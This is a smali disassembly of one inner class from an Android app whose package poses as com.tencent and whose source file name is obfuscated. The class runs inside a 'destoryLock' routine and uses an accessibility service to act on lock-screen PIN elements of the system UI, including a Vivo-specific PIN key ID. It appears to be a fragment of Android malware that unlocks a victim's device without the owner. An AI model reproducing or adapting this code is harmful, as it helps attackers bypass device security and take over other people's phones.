.class Lcom/tencent/ScreenLockMonitor$2;
.super Ljava/lang/Object;
.source "Loc_tunesxconcerningn10_k.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/tencent/ScreenLockMonitor;->destoryLock(Lcom/tencent/AccessibilityServiceCore;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic val$classGen12:Lcom/tencent/AccessibilityServiceCore;


# direct methods
.method constructor <init>(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .line 202
    iput-object p1, p0, Lcom/tencent/ScreenLockMonitor$2;->val$classGen12:Lcom/tencent/AccessibilityServiceCore;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 2

    .line 205
    iget-object v0, p0, Lcom/tencent/ScreenLockMonitor$2;->val$classGen12:Lcom/tencent/AccessibilityServiceCore;

    invoke-static {v0}, Lcom/tencent/ScreenLockMonitor;->access$000(Lcom/tencent/AccessibilityServiceCore;)V

    .line 206
    iget-object v0, p0, Lcom/tencent/ScreenLockMonitor$2;->val$classGen12:Lcom/tencent/AccessibilityServiceCore;

    invoke-static {v0}, Lcom/tencent/ScreenLockMonitor;->access$100(Lcom/tencent/AccessibilityServiceCore;)I

    move-result v0

    const/4 v1, 0x1

    if-ne v0, v1, :cond_0

    .line 208
    iget-object v0, p0, Lcom/tencent/ScreenLockMonitor$2;->val$classGen12:Lcom/tencent/AccessibilityServiceCore;

    const-string v1, "com.android.systemui:id/key"

    invoke-static {v0, v1}, Lcom/tencent/ScreenLockMonitor;->access$200(Lcom/tencent/AccessibilityServiceCore;Ljava/lang/String;)V

    goto :goto_0

    :cond_0
    const/4 v1, 0x2

    if-ne v0, v1, :cond_1

    .line 210
    iget-object v0, p0, Lcom/tencent/ScreenLockMonitor$2;->val$classGen12:Lcom/tencent/AccessibilityServiceCore;

    invoke-static {v0}, Lcom/tencent/ScreenLockMonitor;->access$300(Lcom/tencent/AccessibilityServiceCore;)V

    goto :goto_0

    :cond_1
    const/4 v1, 0x3

    if-ne v0, v1, :cond_2

    .line 212
    iget-object v0, p0, Lcom/tencent/ScreenLockMonitor$2;->val$classGen12:Lcom/tencent/AccessibilityServiceCore;

    const-string v1, "com.android.systemui:id/VivoPinkey"

    invoke-static {v0, v1}, Lcom/tencent/ScreenLockMonitor;->access$200(Lcom/tencent/AccessibilityServiceCore;Ljava/lang/String;)V

    :cond_2
    :goto_0
    return-void
.end method
